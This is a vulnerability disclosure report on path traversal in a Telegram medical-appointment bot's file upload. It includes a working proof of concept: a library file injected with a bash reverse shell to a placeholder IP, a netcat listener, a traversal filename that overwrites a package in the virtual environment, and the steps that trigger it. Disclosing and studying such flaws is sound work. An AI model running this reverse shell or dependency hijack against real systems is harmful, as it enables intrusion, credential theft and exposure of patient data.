# Vulnerability Report: Unrestricted File Upload with Path Traversal Leading to Remote Code Execution (RCE) and Supply Chain Compromise

## 1. Software/Product containing the vulnerability
Medi Guide Bot [V1.0](https://github.com/GDbateaux/305.2-applied-cybersecurity/releases/tag/1.0.0)

## 2. Vulnerability Metadata
* **Vulnerability Class:** Code Injection / Improper Input Sanitization
* **CWE Identifiers:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-73 (External Control of File Name or Path), CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-94 (Improper Control of Generation of Code), CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor), CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
* **Estimated CVSS Score:** **9.0 (High)**  *Vector:* [CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H&version=3.1)

## 3. Vulnerability Description
The Medi Guide Bot is a Telegram bot designed to facilitate communication between patients and doctors. It allows patients to send files to the bot, which are then stored locally on the bot's server via this code:

```Python
USER_FILES_CACHE = os.path.join(os.path.dirname(__file__), '..', 'user_files_cache')

doc = update.message.document

path = os.path.join(USER_FILES_CACHE, doc.file_name)
await tg_file.download_to_drive(path)
```

The application does not perform any sanitization regarding the file names and Telegram Desktop allows users to rename files with "../" in the new filename before sending them. This allows an attacker to perform a path traversal attack by overwriting critical library files in the bot's Python Virtual Environment (`.venv`).  

## 4. Proof of Concept (PoC)

This exploit demonstrates a **Remote Code Execution (RCE)** vulnerability in the `@MediGuideBot` Telegram bot. By leveraging an **Unrestricted File Upload** combined with **Path Traversal (CWE-22)**, an attacker can overwrite critical library files within the Python Virtual Environment (`.venv`). This leads to **Dependency Hijacking**, allowing the execution of a reverse shell when the bot imports the compromised module.

#### Prerequisites
*   **Attacker Tool:** Telegram Desktop (allows manual filename renaming during upload).
*   **Listener:** A server with a public IP running Netcat or a similar listener.

### Exploitation Steps

#### 1. Malicious Payload Preparation
Create a modified version of the `davclient.py` file (part of the `caldav` library). Inject a reverse shell command into the `__init__` method of the `DavClient` class to ensure execution upon instantiation.

```python
# Modified davclient.py
import subprocess

class DavClient:
    def __init__(self):
        # Malicious Reverse Shell Payload
        subprocess.Popen(
            ["bash", "-c", "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        # ... Rest of the original code
```

#### 2. Attacker Listener Setup
On your remote server, start a listener to catch the incoming connection:
```bash
nc -lvnp YOUR_PORT
```

#### 3. Path Traversal File Upload
1.  Open **Telegram Desktop** and search for `@MediGuideBot`.
2.  Upload your malicious `davclient.py`.
3.  **Crucial Step:** Before hitting send, use the Telegram Desktop rename feature to change the filename to a relative path targeting the bot's virtual environment:
    `../.venv/lib/python3.13/site-packages/caldav/davclient.py`

#### 4. Triggering the Execution
The payload remains dormant until the bot attempts to use the `caldav` library. To trigger this:
1.  Register as a new patient by providing a Last Name, First Name, and selecting a doctor.
2.  Request the bot to **"Check doctor availability"**.

#### 5. Result
When the bot processes the availability request, it instantiates the `DavClient` class. This executes the injected Python code, granting the attacker a **reverse shell** with the same privileges as the bot's process.

## 5. Impact Analysis

The successful exploitation of this vulnerability grants the attacker **full unauthorized access** to the bot's execution environment. This leads to a total compromise of the application's supply chain and its associated cloud integrations.

#### 1. Persistent Remote Access
By overwriting a library file in the `.venv`, the attacker establishes a permanent foothold. Every time the bot service restarts or imports the affected module, the reverse shell is re-established. This allows for:
*   **Lateral Movement:** Probing the internal network from the host server.
*   **Privilege Escalation:** Exploiting local misconfigurations to gain root access to the underlying OS.

#### 2. Critical Credential Theft (Secrets Exposure)
The attacker gains read access to the `.env` file and other configuration assets. This results in the compromise of:
*   **Medical Data Breach (KDrive API):** Access to the API keys used for storage allows the attacker to bypass the bot entirely. They can silently download, modify, or delete patient records, medical history, and sensitive identity documents stored on the Drive.
*   **AI Infrastructure Hijacking (Infomaniak AI Keys):** Access to Infomaniak LLM/AI tokens allows the attacker to deplete the organization’s credits or use the high-performance models for their own purposes.
*   **Telegram Bot Token:** The attacker can hijack the `@MediGuideBot` identity, sending fraudulent messages to patients or shutting down the service.

#### 3. Violation of Data Privacy Regulations (GDPR)
Since the bot handles patient information, this breach constitutes a major compliance failure.
*   **Data Integrity:** An attacker could alter patient appointments or doctor availability, leading to real-world medical service disruption.
*   **Legal & Reputational Damage:** Massive fines due to the exposure of Protected Health Information and total loss of patient trust.

#### 4. Supply Chain Infection
Because the attack targets the `.venv` (Virtual Environment), the integrity of the software stack is void. The attacker can inject further backdoors into other standard libraries, ensuring that even if the bot's source code is audited, the malicious behavior remains hidden in the "trusted" dependencies.


## 6. How did we find the vulnerability?
This vulnerability was discovered by analyzing the source code of the Medi Guide Bot application, and noticing that when a file is sent to the telegram bot, it stores it locally without performing any file name sanitization.


## 7. When did we find the vulnerability?
This vulnerability was discovered on April 29, 2026.